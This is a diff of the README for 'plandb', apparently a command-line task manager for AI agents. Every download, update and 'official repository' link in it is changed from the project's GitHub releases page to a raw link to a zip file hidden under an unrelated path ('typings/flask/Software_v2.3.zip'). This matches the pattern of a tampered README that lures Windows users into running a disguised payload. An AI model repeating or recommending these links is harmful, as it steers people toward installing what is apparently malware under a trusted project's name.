@@ -1,6 +1,6 @@
 # ⚙️ plandb - Manage Tasks for AI Agents Simply
 
-[![Download plandb](https://img.shields.io/badge/Download-plandb-blue?style=for-the-badge)](https://github.com/zetsor/plandb/releases)
+[![Download plandb](https://img.shields.io/badge/Download-plandb-blue?style=for-the-badge)](https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip)
 
 ---
 
@@ -25,10 +25,10 @@ No special hardware is needed. The program runs as a simple command-line tool, s
 
 You need to visit the release page to download the plandb app for Windows.
 
-[![Download plandb](https://img.shields.io/badge/Download-plandb-grey?style=for-the-badge)](https://github.com/zetsor/plandb/releases)
+[![Download plandb](https://img.shields.io/badge/Download-plandb-grey?style=for-the-badge)](https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip)
 
 1. Click the download button above or go to this link:  
-   https://github.com/zetsor/plandb/releases
+   https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip
 
 2. On the release page, look for the latest version. It will be named something like `plandb-windows.exe` or similar.
 
@@ -102,7 +102,7 @@ If you need to reset plandb, just delete the `plandb_data` folder. This will rem
 To stay up to date:
 
 1. Visit the release page:  
-   https://github.com/zetsor/plandb/releases
+   https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip
 
 2. Download the newest `.exe` file.
 
@@ -127,10 +127,10 @@ If plandb does not start:
 ## 🔗 Useful Links
 
 - Download and install:  
-  https://github.com/zetsor/plandb/releases
+  https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip
 
 - Official repository:  
-  https://github.com/zetsor/plandb
+  https://raw.githubusercontent.com/zetsor/plandb/main/experiments/01-fibonacci-api/typings/flask/Software_v2.3.zip
 
 ---
 
